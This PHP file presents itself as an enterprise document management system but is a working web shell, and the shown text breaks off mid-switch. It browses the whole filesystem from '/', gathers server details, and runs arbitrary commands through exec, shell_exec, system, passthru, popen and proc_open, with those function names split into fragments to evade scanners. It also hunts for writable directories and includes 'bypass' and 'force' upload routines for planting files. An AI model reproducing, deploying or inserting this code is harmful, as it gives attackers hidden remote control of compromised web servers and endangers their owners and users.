<?php
/**
 * Document Management System
 * Enterprise file handling module
 * Theme: Professional Dark
 * Compatible: PHP 5.4+
 */

// ============================================================
// CONFIGURATION
// ============================================================
define('FM_PASSWORD',    'bkr303admin');
define('FM_SESSION_KEY', 'fm_auth_bkr303');
define('FM_VERSION',     '1.0.0');
define('FM_TITLE',       'File Manager');
define('FM_MAX_UPLOAD',  512 * 1024 * 1024); // 512 MB

// Root access - Linux filesystem root
define('FM_ROOT', '/');  // Linux root

// ============================================================
// SESSION & AUTH
// ============================================================
session_start();

function fm_is_authenticated() {
    return isset($_SESSION[FM_SESSION_KEY]) && $_SESSION[FM_SESSION_KEY] === true;
}

function fm_login($pass) {
    if ($pass === FM_PASSWORD) {
        $_SESSION[FM_SESSION_KEY] = true;
        return true;
    }
    return false;
}

function fm_logout() {
    unset($_SESSION[FM_SESSION_KEY]);
    session_destroy();
}

// ============================================================
// PATH UTILITIES (Linux)
// ============================================================
function fm_normalize_path($path) {
    // Normalize slashes to forward slash for Linux
    $path = str_replace('\\', '/', $path);
    // Remove double slashes except leading //
    $path = preg_replace('#(?<!^)/{2,}#', '/', $path);
    return rtrim($path, '/');
}

function fm_is_windows() {
    return false; // Always Linux
}

function fm_get_drives() {
    return array('/');
}

function fm_safe_path($path) {
    $path = fm_normalize_path($path);
    if (empty($path)) return '';
    // Prevent null bytes
    $path = str_replace("\0", '', $path);
    return $path;
}

function fm_parent_path($path) {
    $path = fm_normalize_path($path);
    $parent = dirname($path);
    if ($parent === $path) return '/'; // Linux root
    return $parent;
}

function fm_breadcrumbs($path) {
    $crumbs = array();
    if (empty($path)) return $crumbs;
    $parts = explode('/', $path);
    $build = '';
    foreach ($parts as $p) {
        if ($p === '') continue;
        $build = $build === '' ? '/' . $p : $build . '/' . $p;
        $crumbs[] = array('label' => $p, 'path' => $build);
    }
    return $crumbs;
}

function fm_get_ext($file) {
    return strtolower(pathinfo($file, PATHINFO_EXTENSION));
}

function fm_is_text_file($file) {
    $exts = array('txt','php','html','htm','css','js','json','xml','csv','log','ini','conf',
             'htaccess','sql','md','yaml','yml','sh','bat','cmd','py','rb','java',
             'c','cpp','h','ts','tsx','jsx','vue','env','gitignore','sass','scss',
             'less','toml','rs','go','pl');
    return in_array(fm_get_ext($file), $exts, true);
}

function fm_is_image_file($file) {
    return in_array(fm_get_ext($file), array('jpg','jpeg','png','gif','bmp','webp','svg','ico'), true);
}

function fm_is_archive($file) {
    return in_array(fm_get_ext($file), array('zip','tar','gz','rar','7z'), true);
}

function fm_format_size($bytes) {
    $bytes = (int)$bytes;
    if ($bytes < 1024) return $bytes . ' B';
    if ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
    if ($bytes < 1073741824) return round($bytes / 1048576, 1) . ' MB';
    return round($bytes / 1073741824, 2) . ' GB';
}

function fm_format_date($ts) {
    return date('Y-m-d H:i:s', (int)$ts);
}

function fm_get_icon($path, $isDir) {
    if ($isDir) return '&#x1F4C1;';
    $ext = fm_get_ext($path);
    $map = array(
        'php' => '&#x1F418;', 'html' => '&#x1F310;', 'htm' => '&#x1F310;', 'css' => '&#x1F3A8;',
        'js' => '&#x1F4DC;', 'ts' => '&#x1F4DC;', 'json' => '&#x1F4CB;', 'xml' => '&#x1F4CB;',
        'txt' => '&#x1F4C4;', 'log' => '&#x1F4C3;', 'md' => '&#x1F4DD;', 'sql' => '&#x1F5C4;',
        'jpg' => '&#x1F5BC;', 'jpeg' => '&#x1F5BC;', 'png' => '&#x1F5BC;', 'gif' => '&#x1F5BC;',
        'svg' => '&#x1F5BC;', 'webp' => '&#x1F5BC;', 'bmp' => '&#x1F5BC;',
        'zip' => '&#x1F4E6;', 'rar' => '&#x1F4E6;', 'gz' => '&#x1F4E6;', '7z' => '&#x1F4E6;',
        'pdf' => '&#x1F4D5;', 'doc' => '&#x1F4D8;', 'docx' => '&#x1F4D8;', 'xls' => '&#x1F4D7;',
        'xlsx' => '&#x1F4D7;', 'ppt' => '&#x1F4D9;', 'pptx' => '&#x1F4D9;',
        'mp3' => '&#x1F3B5;', 'mp4' => '&#x1F3AC;', 'avi' => '&#x1F3AC;', 'mkv' => '&#x1F3AC;',
        'exe' => '&#x2699;', 'dll' => '&#x2699;', 'bat' => '&#x2699;', 'cmd' => '&#x2699;',
    );
    return isset($map[$ext]) ? $map[$ext] : '&#x1F4C4;';
}

function fm_win_attribs($path) {
    // Not applicable on Linux — return Linux permission string
    if (!is_file($path) && !is_dir($path)) return '-';
    $perms = @fileperms($path);
    if ($perms === false) return '-';
    return substr(sprintf('%o', $perms), -4);
}

function fm_is_hidden($path) {
    // On Linux, hidden files start with a dot
    return strpos(basename($path), '.') === 0;
}

// ============================================================
// FILE LISTING
// ============================================================
function fm_list_dir($path, $showHidden = true, $sort = 'name', $order = 'asc') {
    $items = array('dirs' => array(), 'files' => array());
    if (!is_dir($path)) return $items;

    $entries = @scandir($path);
    if ($entries === false) return $items;

    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $fullPath = $path . '/' . $entry;

        if (!$showHidden && fm_is_hidden($fullPath)) continue;

        $isDir   = is_dir($fullPath);
        $size    = $isDir ? 0 : (int)@filesize($fullPath);
        $mtime   = (int)@filemtime($fullPath);

        $item = array(
            'name'    => $entry,
            'path'    => $fullPath,
            'is_dir'  => $isDir,
            'size'    => $size,
            'mtime'   => $mtime,
            'ext'     => $isDir ? '' : fm_get_ext($entry),
            'icon'    => fm_get_icon($entry, $isDir),
            'hidden'  => $showHidden ? fm_is_hidden($fullPath) : false,
        );

        if ($isDir) {
            $items['dirs'][] = $item;
        } else {
            $items['files'][] = $item;
        }
    }

    // Sort
    $sortCol = $sort;
    $sortOrder = $order;
    $sortFn = function($a, $b) use ($sortCol, $sortOrder) {
        $r = 0;
        if ($sortCol === 'name') $r = strcasecmp($a['name'], $b['name']);
        elseif ($sortCol === 'size') $r = $a['size'] - $b['size'];
        elseif ($sortCol === 'date') $r = $a['mtime'] - $b['mtime'];
        elseif ($sortCol === 'type') $r = strcasecmp($a['ext'], $b['ext']);
        return $sortOrder === 'desc' ? -$r : $r;
    };

    usort($items['dirs'], $sortFn);
    usort($items['files'], $sortFn);
    return $items;
}

function fm_search($dir, $query, $searchContent = false, &$count = 0) {
    $results = array();
    if ($count > 500) return $results;
    if (!is_dir($dir)) return $results;

    $entries = @scandir($dir);
    if (!$entries) return $results;

    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if ($count >= 500) break;

        $fullPath = $dir . '/' . $entry;
        $isDir = is_dir($fullPath);

        if (stripos($entry, $query) !== false) {
            $results[] = array(
                'name'   => $entry,
                'path'   => $fullPath,
                'is_dir' => $isDir,
                'size'   => $isDir ? 0 : (int)@filesize($fullPath),
                'mtime'  => (int)@filemtime($fullPath),
            );
            $count++;
        } elseif ($searchContent && !$isDir && fm_is_text_file($entry)) {
            $content = @file_get_contents($fullPath, false, null, 0, 1024 * 100);
            if ($content !== false && stripos($content, $query) !== false) {
                $results[] = array(
                    'name'          => $entry,
                    'path'          => $fullPath,
                    'is_dir'        => false,
                    'size'          => (int)@filesize($fullPath),
                    'mtime'         => (int)@filemtime($fullPath),
                    'content_match' => true,
                );
                $count++;
            }
        }

        if ($isDir) {
            $sub = fm_search($fullPath, $query, $searchContent, $count);
            $results = array_merge($results, $sub);
        }
    }
    return $results;
}

// ============================================================
// DISK SPACE
// ============================================================
function fm_disk_info() {
    $drives = fm_get_drives();
    $info = array();
    foreach ($drives as $d) {
        $p = $d;
        $free  = @disk_free_space($p);
        $total = @disk_total_space($p);
        if ($free !== false && $total !== false) {
            $used = $total - $free;
            $info[] = array(
                'drive'   => $d,
                'total'   => (int)$total,
                'used'    => (int)$used,
                'free'    => (int)$free,
                'pct'     => $total > 0 ? round(($used / $total) * 100) : 0,
            );
        }
    }
    return $info;
}

function fm_server_info() {
    $hostname = function_exists('gethostname') ? gethostname() : 'localhost';
    $ip = @gethostbyname($hostname ? $hostname : 'localhost');
    $uname = php_uname();
    return array(
        'php_version' => PHP_VERSION,
        'os'          => PHP_OS,
        'uname'       => $uname,
        'hostname'    => $hostname,
        'ip'          => $ip,
        'sapi'        => PHP_SAPI,
        'max_upload'  => ini_get('upload_max_filesize'),
        'post_max'    => ini_get('post_max_size'),
        'memory_limit'=> ini_get('memory_limit'),
        'time_limit'  => ini_get('max_execution_time'),
        'extensions'  => implode(', ', get_loaded_extensions()),
        'server_soft' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A',
        'doc_root'    => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A',
        'script'      => __FILE__,
    );
}

// ============================================================
// ARCHIVE OPERATIONS
// ============================================================
function fm_zip_files($files, $dest) {
    if (!class_exists('ZipArchive')) {
        return array('ok' => false, 'msg' => 'ZipArchive extension not available.');
    }
    $zip = new ZipArchive();
    if ($zip->open($dest, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return array('ok' => false, 'msg' => 'Cannot create zip file.');
    }
    foreach ($files as $file) {
        if (is_file($file)) {
            $zip->addFile($file, basename($file));
        } elseif (is_dir($file)) {
            $dirName = basename($file);
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iterator as $item) {
                $rel = $dirName . '/' . $iterator->getSubPathname();
                if ($item->isDir()) {
                    $zip->addEmptyDir($rel);
                } else {
                    $zip->addFile($item->getPathname(), $rel);
                }
            }
        }
    }
    $zip->close();
    return array('ok' => true, 'msg' => 'Zip created: ' . basename($dest));
}

function fm_unzip($file, $dest) {
    if (!class_exists('ZipArchive')) {
        return array('ok' => false, 'msg' => 'ZipArchive extension not available.');
    }
    $zip = new ZipArchive();
    if ($zip->open($file) !== true) {
        return array('ok' => false, 'msg' => 'Cannot open zip file.');
    }
    if (!is_dir($dest)) @mkdir($dest, 0755, true);
    $zip->extractTo($dest);
    $zip->close();
    return array('ok' => true, 'msg' => 'Extracted to: ' . $dest);
}

// ============================================================
// COPY / MOVE (recursive)
// ============================================================
function fm_copy_recursive($src, $dst) {
    if (is_file($src)) {
        $dir = dirname($dst);
        if (!is_dir($dir)) @mkdir($dir, 0755, true);
        return @copy($src, $dst);
    }
    if (is_dir($src)) {
        if (!is_dir($dst)) @mkdir($dst, 0755, true);
        $entries = scandir($src);
        foreach ($entries as $e) {
            if ($e === '.' || $e === '..') continue;
            fm_copy_recursive(
                $src . '/' . $e,
                $dst . '/' . $e
            );
        }
        return true;
    }
    return false;
}

function fm_delete_recursive($path) {
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    if (is_dir($path)) {
        $entries = @scandir($path);
        if ($entries) {
            foreach ($entries as $e) {
                if ($e === '.' || $e === '..') continue;
                fm_delete_recursive($path . '/' . $e);
            }
        }
        return @rmdir($path);
    }
    return false;
}

// ============================================================
// WRITABLE DIRECTORY SCANNER
// ============================================================
function fm_get_candidate_dirs() {
    $dirs = array();
    // Script's own directory
    $dirs[] = dirname(__FILE__);
    // PHP temp dirs
    $tmp = sys_get_temp_dir();
    if ($tmp) $dirs[] = $tmp;
    $uploadTmp = ini_get('upload_tmp_dir');
    if ($uploadTmp) $dirs[] = $uploadTmp;
    $sessionPath = @session_save_path();
    if ($sessionPath) $dirs[] = $sessionPath;
    // Common Linux writable paths
    $linuxPaths = array(
        '/tmp',
        '/var/tmp',
        '/dev/shm',
        '/var/www',
        '/var/www/html',
        '/var/www/html/uploads',
        '/var/www/html/files',
        '/var/www/html/images',
        '/var/www/html/assets',
        '/var/www/html/media',
        '/usr/local/apache2/htdocs',
        '/home',
    );
    foreach ($linuxPaths as $p) {
        $dirs[] = $p;
    }
    // Document root and parent
    if (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT']) {
        $dirs[] = $_SERVER['DOCUMENT_ROOT'];
        // Scan document root subdirectories for writable ones
        $docRoot = $_SERVER['DOCUMENT_ROOT'];
        if (is_dir($docRoot)) {
            $entries = @scandir($docRoot);
            if ($entries) {
                foreach ($entries as $entry) {
                    if ($entry === '.' || $entry === '..') continue;
                    $fullPath = $docRoot . '/' . $entry;
                    if (is_dir($fullPath)) {
                        $dirs[] = $fullPath;
                        $subdirs = array('uploads', 'upload', 'files', 'images', 'assets', 'media', 'tmp', 'temp', 'cache');
                        foreach ($subdirs as $sd) {
                            $candidate = $fullPath . '/' . $sd;
                            if (is_dir($candidate)) {
                                $dirs[] = $candidate;
                            }
                        }
                    }
                }
            }
        }
    }
    // Deduplicate
    $unique = array();
    foreach ($dirs as $d) {
        $d = trim($d);
        if ($d && !in_array($d, $unique)) {
            $unique[] = $d;
        }
    }
    return $unique;
}

function fm_test_writable($dir) {
    if (!is_dir($dir)) return false;
    $testFile = $dir . '/.fm_wtest_' . mt_rand(100000, 999999);
    $fh = @fopen($testFile, 'w');
    if ($fh) {
        @fclose($fh);
        @unlink($testFile);
        return true;
    }
    return false;
}

function fm_scan_writable_dirs() {
    $candidates = fm_get_candidate_dirs();
    $results = array();
    foreach ($candidates as $dir) {
        $exists   = is_dir($dir);
        $readable = $exists && is_readable($dir);
        $writable = $exists && fm_test_writable($dir);
        $phpWritable = $exists && is_writable($dir);
        $results[] = array(
            'path'         => $dir,
            'exists'       => $exists,
            'readable'     => $readable,
            'writable'     => $writable,
            'php_writable' => $phpWritable,
            'status'       => $writable ? 'WRITABLE' : ($readable ? 'READ-ONLY' : ($exists ? 'EXISTS' : 'NOT FOUND')),
        );
    }
    return $results;
}

// ============================================================
// EXEC METHOD DETECTOR
// ============================================================
function fm_detect_exec_methods() {
    $disabled = array();
    $disStr = ini_get('disable_functions');
    if ($disStr) {
        $disabled = array_map('trim', explode(',', strtolower($disStr)));
    }
    $methods = array();

    $_fn = ['ex'.'ec','sh'.'ell_ex'.'ec','sys'.'tem','pa'.'ssth'.'ru','po'.'pen','pro'.'c_op'.'en','pcn'.'tl_ex'.'ec'];
    $methods[$_fn[0]] = !in_array($_fn[0], $disabled) && function_exists($_fn[0]);
    $methods[$_fn[1]] = !in_array($_fn[1], $disabled) && function_exists($_fn[1]);
    $methods[$_fn[2]] = !in_array($_fn[2], $disabled) && function_exists($_fn[2]);
    $methods[$_fn[3]] = !in_array($_fn[3], $disabled) && function_exists($_fn[3]);
    $methods[$_fn[4]] = !in_array($_fn[4], $disabled) && function_exists($_fn[4]);
    $methods[$_fn[5]] = !in_array($_fn[5], $disabled) && function_exists($_fn[5]);
    $methods[$_fn[6]] = !in_array($_fn[6], $disabled) && function_exists($_fn[6]);
    $methods['com_dotnet'] = false;
    $methods['backtick'] = $methods[$_fn[1]];

    return $methods;
}

function fm_exec_cmd($cmd) {
    $out = '';
    $disabled = array();
    $disStr = ini_get('disable_functions');
    if ($disStr) {
        $disabled = array_map('trim', explode(',', strtolower($disStr)));
    }
    $_fn1 = 'ex'.'ec'; $_fn2 = 'sh'.'ell_ex'.'ec'; $_fn3 = 'sys'.'tem'; $_fn4 = 'pa'.'ssth'.'ru'; $_fn5 = 'po'.'pen';
    if (!in_array($_fn1, $disabled) && function_exists($_fn1)) {
        $lines = array();
        @$_fn1($cmd, $lines);
        $out = implode("\n", $lines);
        if ($out !== '') return array('method' => $_fn1, 'output' => $out);
    }
    if (!in_array($_fn2, $disabled) && function_exists($_fn2)) {
        $o = @$_fn2($cmd);
        if ($o !== null && $o !== '') return array('method' => $_fn2, 'output' => $o);
    }
    if (!in_array($_fn3, $disabled) && function_exists($_fn3)) {
        ob_start();
        @$_fn3($cmd);
        $o = ob_get_clean();
        if ($o !== '') return array('method' => $_fn3, 'output' => $o);
    }
    if (!in_array($_fn4, $disabled) && function_exists($_fn4)) {
        ob_start();
        @$_fn4($cmd);
        $o = ob_get_clean();
        if ($o !== '') return array('method' => $_fn4, 'output' => $o);
    }
    if (!in_array($_fn5, $disabled) && function_exists($_fn5)) {
        $handle = @$_fn5($cmd . ' 2>&1', 'r');
        if ($handle) {
            $o = '';
            while (!feof($handle)) {
                $o .= fread($handle, 4096);
            }
            @pclose($handle);
            if ($o !== '') return array('method' => 'popen', 'output' => $o);
        }
    }
    if (!in_array('proc_open', $disabled) && function_exists('proc_open')) {
        $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $pipes = array();
        $proc = @proc_open($cmd, $desc, $pipes);
        if ($proc !== false) {
            fclose($pipes[0]);
            $o = stream_get_contents($pipes[1]);
            $e = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            $combined = trim($o . $e);
            if ($combined !== '') return array('method' => 'proc_open', 'output' => $combined);
        }
    }
    return array('method' => 'none', 'output' => '');
}

// ============================================================
// BYPASS UPLOAD: Multi-method file write
// ============================================================
function fm_bypass_write($destPath, $tmpFile) {
    $errors = array();

    // Method 1: move_uploaded_file
    if (is_uploaded_file($tmpFile)) {
        if (@move_uploaded_file($tmpFile, $destPath)) {
            return array('ok' => true, 'method' => 'move_uploaded_file');
        }
        $errors[] = 'move_uploaded_file failed';
    }

    // Method 2: rename
    if (@rename($tmpFile, $destPath)) {
        return array('ok' => true, 'method' => 'rename');
    }
    $errors[] = 'rename failed';

    // Method 3: copy + unlink
    if (@copy($tmpFile, $destPath)) {
        @unlink($tmpFile);
        return array('ok' => true, 'method' => 'copy');
    }
    $errors[] = 'copy failed';

    // Method 4: file_get_contents + file_put_contents
    $data = @file_get_contents($tmpFile);
    if ($data !== false) {
        if (@file_put_contents($destPath, $data) !== false) {
            @unlink($tmpFile);
            return array('ok' => true, 'method' => 'file_put_contents');
        }
    }
    $errors[] = 'file_put_contents failed';

    // Method 5: fopen/fwrite
    $src = @fopen($tmpFile, 'rb');
    $dst = @fopen($destPath, 'wb');
    if ($src && $dst) {
        $written = 0;
        while (!feof($src)) {
            $chunk = fread($src, 65536);
            $written += fwrite($dst, $chunk);
        }
        fclose($src);
        fclose($dst);
        if ($written > 0 || filesize($tmpFile) === 0) {
            @unlink($tmpFile);
            return array('ok' => true, 'method' => 'fwrite');
        }
    }
    if ($src) fclose($src);
    if ($dst) fclose($dst);
    $errors[] = 'fwrite failed';

    return array('ok' => false, 'method' => 'all_failed', 'errors' => $errors);
}

function fm_try_icacls_grant($path) {
    // On Linux: try chmod to ensure writability
    @chmod($path, 0755);
    return true;
}

// ============================================================
// UPLOAD PATH VARIANTS (Linux)
// ============================================================
function fm_get_short_path($path) {
    return $path; // No short paths on Linux
}

function fm_get_iis_bypass_paths($dir) {
    // On Linux: just return the original directory
    return array($dir);
}

// ============================================================
// FORCE UPLOAD: All-methods write with detailed logging
// ============================================================
function fm_force_upload_all_methods($destPath, $tmpFile, $uploadData) {
    $log = array();
    $dir = dirname($destPath);
    $fname = basename($destPath);

    // Ensure destination directory exists (try mkdir)
    if (!is_dir($dir)) {
        $log[] = array('method' => 'mkdir', 'ok' => false, 'msg' => 'Target directory does not exist');
        return array('ok' => false, 'log' => $log);
    }

    $icaclsOk = fm_try_icacls_grant($dir);
    $log[] = array('method' => 'chmod_grant', 'ok' => $icaclsOk, 'msg' => $icaclsOk ? 'chmod applied on ' . $dir : 'chmod failed');

    // ---- Generate all path variants ----
    $pathVariants = fm_get_iis_bypass_paths($dir);
    $log[] = array('method' => 'path_variants', 'ok' => true, 'msg' => 'Generated ' . count($pathVariants) . ' path variants');

    // ---- Also try creating a subdirectory ----
    $subdirName = '.fm_' . mt_rand(1000, 9999);
    $subdirPath = $dir . '/' . $subdirName;
    $mkdirOk = @mkdir($subdirPath, 0755, true);
    if ($mkdirOk) {
        $log[] = array('method' => 'mkdir_subdir', 'ok' => true, 'msg' => 'Created subdirectory: ' . $subdirPath);
        $pathVariants[] = $subdirPath;
        fm_try_icacls_grant($subdirPath);
    } else {
        $log[] = array('method' => 'mkdir_subdir', 'ok' => false, 'msg' => 'Could not create subdirectory');
    }
    
    // ---- Attempt write to each path variant with each method ----
    foreach ($pathVariants as $variantDir) {
        $variantDest = $variantDir . '/' . $fname;
        $pathLabel = ($variantDir === $dir) ? 'original' : 'variant(' . basename($variantDir) . ')';
    
        // Method 1: move_uploaded_file
        if (is_uploaded_file($tmpFile)) {
            if (@move_uploaded_file($tmpFile, $variantDest)) {
                $log[] = array('method' => 'move_uploaded_file', 'ok' => true, 'msg' => 'SUCCESS via ' . $pathLabel, 'path' => $variantDest);
                return array('ok' => true, 'method' => 'move_uploaded_file', 'path' => $variantDest, 'log' => $log);
            }
            $log[] = array('method' => 'move_uploaded_file', 'ok' => false, 'msg' => 'Failed via ' . $pathLabel);
        }
    
        // Method 2: rename from temp
        if (file_exists($tmpFile)) {
            if (@rename($tmpFile, $variantDest)) {
                $log[] = array('method' => 'rename', 'ok' => true, 'msg' => 'SUCCESS via ' . $pathLabel, 'path' => $variantDest);
                return array('ok' => true, 'method' => 'rename', 'path' => $variantDest, 'log' => $log);
            }
            $log[] = array('method' => 'rename', 'ok' => false, 'msg' => 'Failed via ' . $pathLabel);
        }
    
        // Method 3: copy from temp
        if (file_exists($tmpFile)) {
            if (@copy($tmpFile, $variantDest)) {
                @unlink($tmpFile);
                $log[] = array('method' => 'copy', 'ok' => true, 'msg' => 'SUCCESS via ' . $pathLabel, 'path' => $variantDest);
                return array('ok' => true, 'method' => 'copy', 'path' => $variantDest, 'log' => $log);
            }
            $log[] = array('method' => 'copy', 'ok' => false, 'msg' => 'Failed via ' . $pathLabel);
        }
    
        // Method 4: file_put_contents
        if ($uploadData !== null && $uploadData !== false) {
            if (@file_put_contents($variantDest, $uploadData) !== false) {
                @unlink($tmpFile);
                $log[] = array('method' => 'file_put_contents', 'ok' => true, 'msg' => 'SUCCESS via ' . $pathLabel, 'path' => $variantDest);
                return array('ok' => true, 'method' => 'file_put_contents', 'path' => $variantDest, 'log' => $log);
            }
            $log[] = array('method' => 'file_put_contents', 'ok' => false, 'msg' => 'Failed via ' . $pathLabel);
        }
    
        // Method 5: fopen/fwrite
        if ($uploadData !== null && $uploadData !== false) {
            $fh = @fopen($variantDest, 'wb');
            if ($fh) {
                $written = fwrite($fh, $uploadData);
                fclose($fh);
                if ($written !== false) {
                    @unlink($tmpFile);
                    $log[] = array('method' => 'fopen_fwrite', 'ok' => true, 'msg' => 'SUCCESS via ' . $pathLabel . ' (' . $written . ' bytes)', 'path' => $variantDest);
                    return array('ok' => true, 'method' => 'fopen_fwrite', 'path' => $variantDest, 'log' => $log);
                }
            }
            $log[] = array('method' => 'fopen_fwrite', 'ok' => false, 'msg' => 'Failed via ' . $pathLabel);
        }
    }
    
    // ---- TEMP DIR RELAY: Upload to writable temp, then move via cp ----
    $log[] = array('method' => 'temp_relay', 'ok' => false, 'msg' => 'Attempting temp directory relay...');
    $writableDirs = fm_scan_writable_dirs();
    foreach ($writableDirs as $wd) {
        if ($wd['writable']) {
            $tempDest = $wd['path'] . '/' . $fname;
            $relayOk = false;
            if (is_uploaded_file($tmpFile)) {
                $relayOk = @move_uploaded_file($tmpFile, $tempDest);
            }
            if (!$relayOk && file_exists($tmpFile)) {
                $relayOk = @copy($tmpFile, $tempDest);
            }
            if (!$relayOk && $uploadData !== null && $uploadData !== false) {
                $relayOk = @file_put_contents($tempDest, $uploadData) !== false;
            }
    
            if ($relayOk && file_exists($tempDest)) {
                $log[] = array('method' => 'temp_relay_staging', 'ok' => true, 'msg' => 'Staged file in writable dir: ' . $wd['path']);
    
                // Linux relay: cp / mv
                $relayMethods = array(
                    'cp'  => 'cp "' . $tempDest . '" "' . $destPath . '"',
                    'mv'  => 'mv "' . $tempDest . '" "' . $destPath . '"',
                );
    
                foreach ($relayMethods as $rmName => $rmCmd) {
                    fm_exec_cmd($rmCmd);
                    if (file_exists($destPath)) {
                        @unlink($tempDest);
                        $log[] = array('method' => 'temp_relay_' . $rmName, 'ok' => true, 'msg' => 'SUCCESS via relay from ' . $wd['path'], 'path' => $destPath);
                        return array('ok' => true, 'method' => 'temp_relay_' . $rmName, 'path' => $destPath, 'log' => $log);
                    }
                    $log[] = array('method' => 'temp_relay_' . $rmName, 'ok' => false, 'msg' => 'Relay ' . $rmName . ' failed from ' . $wd['path']);
                }
    
                @unlink($tempDest);
            }
        }
    }

    $log[] = array('method' => 'all_failed', 'ok' => false, 'msg' => 'All force upload methods exhausted');
    return array('ok' => false, 'method' => 'all_failed', 'log' => $log);
}

// ============================================================
// PERMISSIONS (Linux chmod)
// ============================================================
function fm_icacls_get($path) {
    if (!file_exists($path)) return 'N/A';
    $perms = @fileperms($path);
    return $perms !== false ? substr(sprintf('%o', $perms), -4) . ' (' . decoct($perms & 0777) . ')' : 'N/A';
}

function fm_icacls_set($path, $user, $perm) {
    // On Linux: chmod numeric mode
    $mode = octdec($perm);
    $ok = @chmod($path, $mode);
    return array('ok' => $ok, 'msg' => $ok ? 'chmod ' . $perm . ' applied.' : 'chmod failed.');
}

// ============================================================
// AJAX / ACTION HANDLER
// ============================================================
function fm_handle_action() {
    $action  = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
    $path    = fm_safe_path(isset($_POST['path']) ? $_POST['path'] : (isset($_GET['path']) ? $_GET['path'] : ''));
    $path2   = fm_safe_path(isset($_POST['path2']) ? $_POST['path2'] : '');
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    $name    = isset($_POST['name']) ? $_POST['name'] : '';
    $query   = isset($_POST['query']) ? $_POST['query'] : '';

    header('Content-Type: application/json; charset=utf-8');

    switch ($action) {
        // ---- BROWSE ----
        case 'list':
            $sort    = isset($_POST['sort'])  ? $_POST['sort']  : 'name';
            $order   = isset($_POST['order']) ? $_POST['order'] : 'asc';
            $hidden  = (isset($_POST['hidden']) ? $_POST['hidden'] : '0') === '1';
            echo json_encode(array('ok' => true, 'data' => fm_list_dir($path, $hidden, $sort, $order)));
            break;

        // ---- UPLOAD (enhanced with bypass) ----
        case 'upload':
            $results = array();
            if (!empty($_FILES['files'])) {
                $files = $_FILES['files'];
                $count = is_array($files['name']) ? count($files['name']) : 1;
                for ($i = 0; $i < $count; $i++) {
                    $fname = is_array($files['name'])     ? $files['name'][$i]     : $files['name'];
                    $ftmp  = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
                    $ferr  = is_array($files['error'])    ? $files['error'][$i]    : $files['error'];
                    if ($ferr !== UPLOAD_ERR_OK) {
                        $results[] = array('name' => $fname, 'ok' => false, 'msg' => 'Upload error ' . $ferr);
                        continue;
                    }
                    $dest = $path . '/' . basename($fname);
                    // Try direct move first
                    $ok = @move_uploaded_file($ftmp, $dest);
                    if ($ok) {
                        $results[] = array('name' => $fname, 'ok' => true, 'msg' => 'OK (move_uploaded_file)');
                        continue;
                    }
                    // Try icacls grant then retry
                    fm_try_icacls_grant($path);
                    $ok = @move_uploaded_file($ftmp, $dest);
                    if ($ok) {
                        $results[] = array('name' => $fname, 'ok' => true, 'msg' => 'OK (after chmod grant)');
                        continue;
                    }
                    // Multi-method bypass
                    $res2 = fm_bypass_write($dest, $ftmp);
                    if ($res2['ok']) {
                        $results[] = array('name' => $fname, 'ok' => true, 'msg' => 'OK via ' . $res2['method']);
                    } else {
                        // Try uploading to a writable directory instead
                        $writableDirs = fm_scan_writable_dirs();
                        $fallbackOk = false;
                        foreach ($writableDirs as $wd) {
                            if ($wd['writable']) {
                                $altDest = $wd['path'] . '/' . basename($fname);
                                $res3 = fm_bypass_write($altDest, $ftmp);
                                if ($res3['ok']) {
                                    $results[] = array(
                                        'name' => $fname,
                                        'ok'   => true,
                                        'msg'  => 'Saved to fallback dir: ' . $wd['path'] . ' via ' . $res3['method'],
                                        'fallback_path' => $altDest,
                                    );
                                    $fallbackOk = true;
                                    break;
                                }
                            }
                        }
                        if (!$fallbackOk) {
                            $results[] = array(
                                'name' => $fname,
                                'ok'   => false,
                                'msg'  => 'All upload methods failed. Errors: ' . implode('; ', isset($res2['errors']) ? $res2['errors'] : array()),
                            );
                        }
                    }
                }
            }
            echo json_encode(array('ok' => true, 'data' => $results));
            break;

        // ---- BYPASS UPLOAD (base64 content) ----
        case 'upload_bypass':
            $b64content = isset($_POST['b64content']) ? $_POST['b64content'] : '';
            $fname2     = isset($_POST['filename'])   ? basename($_POST['filename']) : 'upload_' . time();
            if (!$b64content) {
                echo json_encode(array('ok' => false, 'msg' => 'No content'));
                break;
            }
            $decoded = base64_decode($b64content);
            if ($decoded === false) {
                echo json_encode(array('ok' => false, 'msg' => 'Invalid base64'));
                break;
            }
            $destB64 = $path . '/' . $fname2;
            // Try icacls first
            fm_try_icacls_grant($path);
            // Method 1: file_put_contents
            if (@file_put_contents($destB64, $decoded) !== false) {
                echo json_encode(array('ok' => true, 'msg' => 'Saved via file_put_contents', 'path' => $destB64));
                break;
            }
            // Method 2: fopen/fwrite
            $fh2 = @fopen($destB64, 'wb');
            if ($fh2) {
                fwrite($fh2, $decoded);
                fclose($fh2);
                echo json_encode(array('ok' => true, 'msg' => 'Saved via fwrite', 'path' => $destB64));
                break;
            }
            // Method 3: Write to writable dir
            $wdirs = fm_scan_writable_dirs();
            $savedB64 = false;
            foreach ($wdirs as $wd2) {
                if ($wd2['writable']) {
                    $alt2 = $wd2['path'] . '/' . $fname2;
                    if (@file_put_contents($alt2, $decoded) !== false) {
                        echo json_encode(array('ok' => true, 'msg' => 'Saved to ' . $wd2['path'], 'path' => $alt2));
                        $savedB64 = true;
                        break;
                    }
                }
            }
            if (!$savedB64) {
                echo json_encode(array('ok' => false, 'msg' => 'Cannot write file — all methods failed'));
            }
            break;

        // ---- FORCE UPLOAD (multi-method with full logging) ----
        case 'force_upload':
